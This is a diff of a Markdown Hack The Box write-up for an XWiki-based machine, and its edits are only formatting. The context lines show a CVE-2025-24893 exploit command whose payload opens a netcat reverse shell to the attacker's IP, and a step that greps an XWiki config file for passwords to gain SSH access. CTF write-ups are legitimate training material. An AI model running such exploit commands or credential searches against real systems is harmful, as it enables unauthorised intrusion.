@@ -4,20 +4,22 @@ date: 2024-11-30
 categories: [Hack-The-Box]
 tags: [CVEs, HTB, PrivEsc]
 author: 0x3bs
-published: false
+#published: false
+image: /assets/images/editor/pp-removebg-preview.png  
 ---
 
 
-![](/assets/images/editor/7.png)
 
 
 ------
 ------
 
 
-> ### Enumeration
+> # Enumeration
 
   
+
+
 first start with `nmap` :
 
 
@@ -139,7 +141,7 @@ After search about this version `XWiko Debian 15.10.8` , i found this CVE
 ----
 
 
-> ### Exploitation
+> # Exploitation
 
 From the `CVE-2025-24893` and after install it , this the exploitation code :
 
@@ -153,7 +155,7 @@ python3 CVE-2025-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.10
 ----
 
 
-> ### SSH Credentials
+> # SSH Credentials
 
 
 In the shell i found this file `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml` which was interesting , let's open it with grepping `password` to find any password in it :
@@ -188,7 +190,7 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
 ----
 
 
-> ### Privilege Escalation 
+> # Privilege Escalation 
 
 
 After running this command :
